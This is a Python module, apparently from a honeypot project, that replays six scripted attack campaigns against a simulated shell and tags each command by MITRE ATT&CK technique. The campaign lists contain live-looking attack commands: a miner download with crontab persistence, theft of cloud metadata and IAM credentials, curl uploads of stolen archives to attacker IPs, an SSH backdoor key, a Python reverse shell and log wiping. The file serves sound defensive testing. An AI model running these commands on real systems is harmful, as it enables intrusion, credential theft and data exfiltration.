"""
Multi-Stage Adversarial Attack Botnet Simulator
Simulates 6 comprehensive cyber offensive campaigns for live telemetry generation
and honeypot resilience benchmarking.
"""
from typing import Dict, Any, List

ATTACK_CAMPAIGNS: Dict[str, Dict[str, Any]] = {
    "alpha": {
        "id": "campaign-alpha",
        "name": "Campaign Alpha: Mirai / XMRig Cryptominer Dropper",
        "description": "Automated Linux botnet reconnaissance, downloading an XMRig cryptominer binary, establishing crontab persistence, and executing mining thread.",
        "attacker_ip": "185.220.101.4",
        "commands": [
            "uname -a",
            "cat /proc/cpuinfo",
            "cat /proc/meminfo",
            "ps -ef",
            "mkdir -p /tmp/.x",
            "cd /tmp/.x",
            "wget http://185.220.101.4/bins/xmrig -O xmrig",
            "chmod +x xmrig",
            "echo '*/5 * * * * /tmp/.x/xmrig' > /tmp/cron_job",
            "crontab /tmp/cron_job",
            "rm -f /tmp/cron_job",
            "./xmrig --algo rx/0 --url stratum+tcp://pool.supportxmr.com:3333 -u 888tNk...",
            "history -c",
            "exit"
        ]
    },
    "bravo": {
        "id": "campaign-bravo",
        "name": "Campaign Bravo: Cloud SSRF to AWS IMDSv2 IAM Harvesting",
        "description": "Cloud-native attacker exploiting SSRF, obtaining AWS IMDSv2 session token, stealing IAM worker credentials, and exfiltrating S3 buckets.",
        "attacker_ip": "45.142.214.88",
        "commands": [
            "whoami",
            "hostname",
            "ip a",
            "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'",
            "curl -s -H 'X-aws-ec2-metadata-token: AQAAAH5e_TOKEN' http://169.254.169.254/latest/meta-data/",
            "curl -s -H 'X-aws-ec2-metadata-token: AQAAAH5e_TOKEN' http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "curl -s -H 'X-aws-ec2-metadata-token: AQAAAH5e_TOKEN' http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-eks-worker-nodes-role",
            "cat /home/ubuntu/.aws/credentials",
            "cat /var/www/html/.env",
            "aws sts get-caller-identity",
            "aws s3 ls",
            "aws s3 cp s3://customer-kyc-documents-vault/dump_2026_11.tar.gz ./dump_2026_11.tar.gz",
            "tar -tzf dump_2026_11.tar.gz",
            "curl -X POST -d @dump_2026_11.tar.gz http://45.142.214.88:8000/loot",
            "rm -f dump_2026_11.tar.gz",
            "exit"
        ]
    },
    "charlie": {
        "id": "campaign-charlie",
        "name": "Campaign Charlie: APT Lateral Movement & /etc/shadow Harvest",
        "description": "Advanced persistent threat actor surveying host, searching for SUID binaries, exploiting sudo privileges, stealing shadow hashes, and planting SSH backdoor keys.",
        "attacker_ip": "194.26.29.112",
        "commands": [
            "id",
            "pwd",
            "ls -la /home/ubuntu",
            "cat /etc/passwd",
            "cat /etc/hosts",
            "netstat -tuln",
            "sudo -l",
            "sudo su",
            "whoami",
            "cat /etc/shadow",
            "mkdir -p /root/.ssh",
            "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICy... apt-backdoor@c2' >> /root/.ssh/authorized_keys",
            "chmod 600 /root/.ssh/authorized_keys",
            "cat /var/log/auth.log",
            "tar -czf /tmp/loot_shadow.tar.gz /etc/shadow /root/.ssh/authorized_keys",
            "curl -X POST --upload-file /tmp/loot_shadow.tar.gz http://194.26.29.112/recv",
            "rm -f /tmp/loot_shadow.tar.gz",
            "exit"
        ]
    },
    "delta": {
        "id": "campaign-delta",
        "name": "Campaign Delta: Kubernetes Token Theft & Container Escape",
        "description": "Intruder enumerating containerized environment, extracting service account tokens, querying Kube API server, and checking Docker socket access.",
        "attacker_ip": "103.152.220.15",
        "commands": [
            "cat /proc/1/cgroup",
            "ls -la /var/run/secrets/kubernetes.io/serviceaccount/",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "export KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
            "kubectl get pods -A",
            "kubectl get secrets",
            "kubectl describe secret rds-db-credentials",
            "ls -la /var/run/docker.sock",
            "docker ps -a",
            "docker images",
            "cat /home/ubuntu/deploy_k8s.sh",
            "curl -k -H 'Authorization: Bearer canary_k8s' https://kubernetes.default.svc/api/v1/namespaces",
            "unset HISTFILE",
            "history -c",
            "exit"
        ]
    },
    "echo": {
        "id": "campaign-echo",
        "name": "Campaign Echo: Obfuscated Base64 Reverse Shell & Defense Evasion",
        "description": "Actor executing an obfuscated base64 python reverse shell payload, modifying file timestamps, and attempting to clear syslogs.",
        "attacker_ip": "91.240.118.172",
        "commands": [
            "whoami",
            "uname -m",
            "echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcw==' | base64 -d",
            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"91.240.118.172\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'",
            "touch -r /bin/ls /tmp/.payload_fake_mtime",
            "find / -name '*.log' 2>/dev/null",
            "cat /dev/null > /home/ubuntu/.bash_history",
            "HISTSIZE=0",
            "unset HISTFILE",
            "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "rm -rf /tmp/.* 2>/dev/null",
            "exit"
        ]
    },
    "foxtrot": {
        "id": "campaign-foxtrot",
        "name": "Campaign Foxtrot: Anti-Honeypot Fingerprinting Probe (Cowrie Defeat)",
        "description": "Red-team scanner probing honeypot state consistency: tests dynamic /proc/uptime, modifies and re-reads file in new sub-shell, invokes IMDSv2, and measures command latency delta.",
        "attacker_ip": "193.142.146.33",
        "commands": [
            "cat /proc/uptime",
            "date",
            "uptime",
            "touch /tmp/honeypot_fingerprint_test_file.txt",
            "echo 'STATE_PERSISTENCE_CHECK_MARKER_9941' > /tmp/honeypot_fingerprint_test_file.txt",
            "cat /tmp/honeypot_fingerprint_test_file.txt",
            "ls -la /tmp",
            "cat /proc/meminfo",
            "cat /proc/cpuinfo",
            "uname -a",
            "curl -s http://169.254.169.254/latest/meta-data/instance-id",
            "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "mkdir -p /tmp/.probe_dir",
            "cd /tmp/.probe_dir && pwd",
            "touch canary.sh && chmod +x canary.sh && ls -l canary.sh",
            "rm -rf /tmp/.probe_dir",
            "ls -la /tmp",
            "cat /proc/uptime",
            "date",
            "exit"
        ]
    }
}


class AttackBotnetSimulator:
    """Manages simulated adversarial campaigns and emits telemetry events."""

    def __init__(self, honeypot_session, mitre_profiler):
        self.session = honeypot_session
        self.profiler = mitre_profiler

    def run_campaign(self, campaign_key: str = "alpha") -> Dict[str, Any]:
        campaign = ATTACK_CAMPAIGNS.get(campaign_key, ATTACK_CAMPAIGNS["alpha"])
        results = []
        attacker_ip = campaign["attacker_ip"]

        for idx, cmd in enumerate(campaign["commands"]):
            # Execute on ChameleonShell
            exec_res = self.session.process_command(cmd)
            # Classify MITRE ATT&CK
            mitre_rec = self.profiler.classify_command(cmd, attacker_ip=attacker_ip)

            results.append({
                "step": idx + 1,
                "command": cmd,
                "execution": exec_res,
                "mitre": mitre_rec
            })

        return {
            "campaign_id": campaign["id"],
            "campaign_name": campaign["name"],
            "description": campaign["description"],
            "attacker_ip": attacker_ip,
            "total_steps": len(results),
            "events": results,
            "final_risk_score": self.profiler.current_risk_score,
            "tactics_distribution": self.profiler.get_tactics_distribution()
        }
